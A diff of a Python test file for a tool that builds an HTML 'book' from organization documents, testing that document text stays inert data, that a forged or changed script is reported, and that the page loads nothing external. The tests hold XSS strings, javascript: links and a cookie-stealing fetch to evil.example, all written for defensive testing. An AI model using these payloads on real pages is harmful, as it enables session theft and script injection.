@@ -1,35 +1,51 @@
 """The book: a copy of the documents that says only what they say, and cannot act.
 
 Three properties are held here. The book derives the cross-references a reader needs. The page
-is inert: nothing a document contains runs, and the page loads nothing. And `dao check` knows
-when the page has fallen behind the documents.
+carries the documents' words as data and runs one script, the element dao ships, so nothing a
+document contains runs. And `dao check` knows when any of the book's files has fallen behind
+the documents. What the element does with the words is held by its own tests, in `web/`.
 """
 
 from __future__ import annotations
 
 import json
+import re
 from importlib import metadata
+from pathlib import Path
 from typing import TYPE_CHECKING
 
 from click.testing import CliRunner
 
 from dao.adapters._in.cli import main
-from dao.adapters._out.html import render, slug, write
+from dao.adapters._out.page import data, element, files, page, write
 from dao.application.audit import POLICY, audit, complete
 from dao.application.book import UNTITLED, build, chains, check
-from dao.application.organization import Organization, rendered_from
+from dao.application.organization import Organization, made_from
 from dao.application.reading import read_participants, read_positions, sections
 from dao.domain.models import Position
 from dao.domain.spec import SPEC, Coverage, Key, Status
 
 if TYPE_CHECKING:
-    from pathlib import Path
-
     import pytest
+
+    from dao.domain.book import Book
+
+BOOK_FILES = (POLICY.book, POLICY.book_data, POLICY.book_element)
 
 
 def _page(project: Path) -> str:
-    return render(build(project), version="test")
+    return page(build(project), version="test")
+
+
+def _files(book: Book) -> dict[str, str]:
+    return files(book, version=metadata.version("dao"))
+
+
+def _carried(html: str) -> object:
+    """The book a page carries, read the way a browser hands it to the element."""
+    blocks = re.findall(r'<script type="application/json">(.*?)</script>', html, re.S)
+    assert len(blocks) == 1
+    return json.loads(blocks[0])
 
 
 def _append(project: Path, name: str, text: str) -> None:
@@ -38,8 +54,8 @@ def _append(project: Path, name: str, text: str) -> None:
 
 
 def _checked(project: Path) -> list[Coverage]:
-    """What `dao check` computes: the audit, with the book held to the page dao writes."""
-    return check(project, render=lambda book: render(book, version=metadata.version("dao")))
+    """What `dao check` computes: the audit, with the book held to the files dao writes."""
+    return check(project, render=_files)
 
 
 def _front_door_gaps(project: Path) -> list[str]:
@@ -102,82 +118,82 @@ def test_an_incomplete_organization_still_makes_a_book_that_says_so(project: Pat
     book = build(project)
     assert not book.complete
     assert book.document(Key.PRINCIPLES).status is Status.ABSENT
-    page = render(book, version="test")
-    assert "This organization is not complete" in page
-    assert "no dao/principles.md" in page
+    assert "no dao/principles.md" in " ".join(book.document(Key.PRINCIPLES).gaps)
+    assert "no dao/principles.md" in data(book)
 
 
-# --- the page is inert --------------------------------------------------------------
+# --- the page cannot act ------------------------------------------------------------
 
 
-def test_the_page_runs_nothing_and_loads_nothing(project: Path) -> None:
-    page = _page(project)
-    assert page.startswith("<!doctype html>")
-    assert "default-src 'none'" in page
-    assert "<script" not in page.lower()
-    assert "http://" not in page and "https://" not in page
-    assert "@import" not in page and "url(" not in page
+def test_the_page_runs_one_script_and_loads_nothing_else(project: Path) -> None:
+    html = _page(project)
+    assert html.startswith("<!doctype html>")
+    assert "default-src 'none'; script-src 'self'; style-src 'unsafe-inline'" in html
+    assert "base-uri 'none'" in html
+    assert re.findall(r"<script[^>]*>", html) == [
+        '<script type="application/json">',
+        f'<script src="{POLICY.book_element}">',
+    ]
+    assert "http://" not in html and "https://" not in html
+    assert "@import" not in html and "url(" not in html
+    assert not re.search(r"\son[a-z]+=", html)
 
 
-def test_html_in_a_document_is_shown_not_run(project: Path) -> None:
-    _append(project, "constitution.md", '\n<script>alert("x")</script>\n\n<img src=x onerror=y>\n')
-    _append(project, "principles.md", "- [click](javascript:alert(1))\n")
-    positions = project / "dao" / "positions.md"
-    positions.write_text(positions.read_text().replace("Merge anything.", "<b onclick=z>Merge</b>"))
-    page = _page(project)
-    assert "<script" not in page.lower()
-    assert "&lt;script&gt;" in page
-    assert "<img" not in page
-    assert "<b onclick" not in page
-    assert 'href="javascript:' not in page
+def test_the_page_carries_the_book_it_was_made_from(project: Path) -> None:
+    book = build(project)
+    assert _carried(page(book, version="test")) == json.loads(data(book))
 
 
-def test_a_hostile_name_cannot_leave_its_place_in_the_page(project: Path) -> None:
+def test_nothing_in_a_document_can_leave_the_data_block(project: Path) -> None:
+    _append(project, "constitution.md", '\n</script><script>alert("x")</script>\n\n<!-- x\n')
+    _append(project, "principles.md", "- </SCRIPT ><img src=x onerror=y>\n")
     participants = project / "dao" / "participants.md"
     participants.write_text(
-        participants.read_text().replace("| ada |", '| ada"><script>x</script> |')
+        participants.read_text().replace("| ada |", '| ada"></script><script>x</script> |')
     )
-    page = _page(project)
-    assert "<script" not in page.lower()
+    readme = project / "dao" / "README.md"
+    readme.write_text(readme.read_text().replace("# How", "# </title><script>t()</script>How"))
+
+    book = build(project)
+    html = page(book, version="test")
+    assert html.lower().count("<script") == 2
+    assert html.lower().count("</script") == 2
+    assert "<!--" not in html and "<img" not in html
+    assert html.count("</title>") == 1
+    # The words are all still there, as data.
+    assert _carried(html) == json.loads(data(book))
+    assert 'alert(\\"x\\")' in data(book)
 
 
-def test_links_between_documents_stay_on_the_page(project: Path) -> None:
-    _append(project, "principles.md", "- See [the site](https://example.org/a).\n")
-    page = _page(project)
-    assert '<a href="#constitution">constitution.md</a>' in page
-    assert '<a href="https://example.org/a" rel="noopener noreferrer">' in page
+def test_the_same_documents_make_the_same_files(project: Path) -> None:
+    assert _files(build(project)) == _files(build(project))
+    assert set(_files(build(project))) == set(BOOK_FILES)
 
 
-def test_section_headings_sit_under_the_page_heading(project: Path) -> None:
-    page = _page(project)
-    assert "<h3>Purpose</h3>" in page
-    assert "<h2>Purpose</h2>" not in page
+def test_the_element_calls_nothing_that_runs_text_or_reaches_the_network() -> None:
+    """A search of the shipped script for the calls that would. The page's policy is the
+    second line: it forbids every load whatever the script asks for."""
+    script = element()
+    for call in (
+        "eval(",
+        "new Function",
+        "import(",
+        "XMLHttpRequest",
+        "WebSocket",
+        "EventSource",
+        "sendBeacon",
+        "Worker(",
+    ):
+        assert call not in script
+    # The one request it can make is for the book its `src` names.
+    assert script.count("fetch(") == 1
 
 
-def test_the_same_documents_make_the_same_page(project: Path) -> None:
-    assert _page(project) == _page(project)
-
-
-def test_slug() -> None:
-    assert slug("The Session") == "the-session"
-    assert slug("***") == "unnamed"
-
-
-def test_only_some_addresses_become_links_or_images(project: Path) -> None:
-    _append(
-        project,
-        "principles.md",
-        "- [share](//evil.example/share/x) [root](/etc/passwd) [smb](smb://evil.example/x)\n"
-        "- [beside](../CONTRIBUTING.md) [mail](mailto:ada@example.org)\n"
-        "- ![remote](//evil.example/p.png) ![rooted](/etc/hosts) ![logo](logo.png)\n",
-    )
-    page = _page(project)
-    assert "evil.example" not in page
-    assert "/etc/passwd" not in page and "/etc/hosts" not in page
-    assert "share" in page and "smb" in page and "remote" in page
-    assert '<a href="../CONTRIBUTING.md">beside</a>' in page
-    assert '<a href="mailto:ada@example.org" rel="noopener noreferrer">mail</a>' in page
-    assert '<img src="logo.png" alt="logo"' in page
+def test_the_element_reads_the_format_the_book_is_written_in(project: Path) -> None:
+    source = Path(__file__).parents[1] / "web" / "src" / "model.ts"
+    declared = re.search(r"^export const FORMAT = (\d+);$", source.read_text(), re.M)
+    assert declared is not None
+    assert int(declared.group(1)) == build(project).format
 
 
 # --- what dao reads from a project ---------------------------------------------------
@@ -247,6 +263,21 @@ def test_no_line_can_make_reading_slow() -> None:
     assert len(chains(line)) == 1
 
 
+def test_a_large_organization_is_read_in_time_linear_in_its_size(project: Path) -> None:
+    """Asking every participant about every position took minutes at this size."""
+    n = 30_000
+    (project / "dao" / "positions.md").write_text(
+        "# Positions\n\n" + "".join(f"## p{i}\n\nDoes: x\n\n" for i in range(n))
+    )
+    (project / "dao" / "participants.md").write_text(
+        "# Participants\n\n| Participant | Kind | Position |\n|---|---|---|\n"
+        + "".join(f"| u{i} | agent | p{i} |\n" for i in range(n))
+    )
+    book = build(project)
+    assert len(book.positions) == n
+    assert book.positions[-1].held_by == (f"u{n - 1}",)
+
+
 def test_a_heading_keeps_its_text_and_loses_closing_hashes() -> None:
     assert list(sections("## Purpose ##\n\nx\n## C# and F#\n\ny\n")) == ["Purpose", "C# and F#"]
 
@@ -257,31 +288,61 @@ def test_a_heading_keeps_its_text_and_loses_closing_hashes() -> None:
 def test_a_fresh_book_is_current_and_an_edit_makes_it_stale(project: Path) -> None:
     assert CliRunner().invoke(main, ["book", str(project)]).exit_code == 0
     org = Organization(project)
-    assert org.book == project / "dao" / POLICY.book
-    assert rendered_from(org.book.read_text()) == org.sources()
+    for name in BOOK_FILES:
+        assert org.book_file(name) == project / "dao" / name
+        assert org.book_file(name).is_file()
+    assert made_from(org.book_file(POLICY.book).read_text()) == org.sources()
+    assert made_from(org.book_file(POLICY.book_data).read_text()) == org.sources()
+    front = next(c for c in _checked(project) if c.element.key is Key.FRONT_DOOR)
+    assert "book.html, book.json, dao-book.js: as `dao book` writes" in front.evidence
     assert complete(_checked(project))
     assert CliRunner().invoke(main, ["check", str(project)]).exit_code == 0
 
     _append(project, "principles.md", "- Write the date in ISO 8601.\n")
-    assert "rendered from older documents" in " ".join(_front_door_gaps(project))
+    stale = " ".join(_front_door_gaps(project))
+    assert "dao/book.html was made from older documents" in stale
+    assert "dao/book.json was made from older documents" in stale
+    assert POLICY.book_element not in stale
 
     assert CliRunner().invoke(main, ["book", str(project)]).exit_code == 0
     assert complete(_checked(project))
-    assert "This organization is not complete" not in org.book.read_text()
 
 
 def test_a_book_dao_did_not_write_is_reported(project: Path) -> None:
     (project / "dao" / POLICY.book).write_text("<html>by hand</html>")
-    assert "is not the page `dao book` writes" in " ".join(_front_door_gaps(project))
+    assert "is not the file `dao book` writes" in " ".join(_front_door_gaps(project))
 
 
 def test_a_forged_book_with_the_right_digest_is_not_vouched_for(project: Path) -> None:
-    """The digest can be copied onto any HTML, so the check renders again and compares."""
+    """The digest can be copied onto anything, so the check makes the files again and compares."""
     digest = Organization(project).sources()
     forged = f'<!doctype html><meta name="dao-sources" content="{digest}"><script>x()</script>'
     (project / "dao" / POLICY.book).write_text(forged)
-    assert "is not the page `dao book` writes" in " ".join(_front_door_gaps(project))
+    (project / "dao" / POLICY.book_data).write_text(f'{{"format": 1, "sources": "{digest}"}}')
+    gaps = " ".join(_front_door_gaps(project))
+    assert "dao/book.html is not the file `dao book` writes" in gaps
+    assert "dao/book.json is not the file `dao book` writes" in gaps
     assert CliRunner().invoke(main, ["check", str(project)]).exit_code == 1
+
+
+def test_an_element_that_is_not_the_one_dao_ships_is_reported(project: Path) -> None:
+    """The page runs this file, so a changed copy is the finding that matters most."""
+    assert CliRunner().invoke(main, ["book", str(project)]).exit_code == 0
+    script = project / "dao" / POLICY.book_element
+    script.write_text(script.read_text() + "\nfetch('https://evil.example/' + document.cookie)\n")
+    assert "dao/dao-book.js is not the file `dao book` writes" in " ".join(
+        _front_door_gaps(project)
+    )
+
+
+def test_a_project_may_keep_only_the_data(project: Path) -> None:
+    """A docsite that draws the book itself needs book.json and nothing else."""
+    assert CliRunner().invoke(main, ["book", str(project)]).exit_code == 0
+    (project / "dao" / POLICY.book).unlink()
+    (project / "dao" / POLICY.book_element).unlink()
+    assert _front_door_gaps(project) == []
+    _append(project, "principles.md", "- Write the date in ISO 8601.\n")
+    assert "dao/book.json was made from older documents" in " ".join(_front_door_gaps(project))
 
 
 def test_a_book_that_is_a_link_is_not_read(
@@ -291,6 +352,19 @@ def test_a_book_that_is_a_link_is_not_read(
     outside.write_text("the secret")
     (project / "dao" / POLICY.book).symlink_to(outside)
     assert "is a symbolic link" in " ".join(_front_door_gaps(project))
+
+
+def test_a_forged_element_is_reported_when_the_readme_is_missing_too(project: Path) -> None:
+    (project / "dao" / POLICY.book_element).write_text("alert('forged')")
+    (project / "dao" / "README.md").unlink()
+    gaps = " ".join(_front_door_gaps(project))
+    assert "no dao/README.md" in gaps
+    assert "dao/dao-book.js is not the file `dao book` writes" in gaps
+
+
+def test_a_participant_listed_twice_is_a_gap(project: Path) -> None:
+    _append(project, "participants.md", "| ada | human | owner | |\n")
+    assert "listed more than once: ada" in _gaps_of(project, Key.PARTICIPANTS)
 
 
 def test_no_book_is_not_a_gap(project: Path) -> None:
@@ -311,10 +385,12 @@ def test_a_missing_document_changes_the_digest(project: Path) -> None:
 def test_book_json_prints_the_organization_and_writes_nothing(project: Path) -> None:
     result = CliRunner().invoke(main, ["book", str(project), "--json"])
     assert result.exit_code == 0
-    data = json.loads(result.output)
-    assert data["title"] == "How tidepool is run"
-    assert data["chains"] == [["builder", "reviewer", "owner"]]
-    assert not (project / "dao" / POLICY.book).exists()
+    assert result.output == data(build(project))
+    printed = json.loads(result.output)
+    assert printed["format"] == 1
+    assert printed["title"] == "How tidepool is run"
+    assert printed["chains"] == [["builder", "reviewer", "owner"]]
+    assert not any((project / "dao" / name).exists() for name in BOOK_FILES)
 
 
 def test_book_needs_a_directory_of_documents(tmp_path: Path) -> None:
@@ -332,6 +408,17 @@ def test_book_does_not_write_through_a_symlink(
     result = CliRunner().invoke(main, ["book", str(project)])
     assert result.exit_code == 1
     assert outside.read_text() == "untouched"
+    assert not (project / "dao" / POLICY.book_data).exists()
+
+
+def test_book_refuses_a_target_that_is_not_a_file_and_writes_nothing(project: Path) -> None:
+    (project / "dao" / POLICY.book).mkdir()
+    result = CliRunner().invoke(main, ["book", str(project)])
+    assert result.exit_code == 1
+    assert "is not a file" in result.output
+    assert not isinstance(result.exception, OSError)
+    assert not (project / "dao" / POLICY.book_data).exists()
+    assert not (project / "dao" / POLICY.book_element).exists()
 
 
 def test_the_write_replaces_a_link_and_does_not_follow_it(
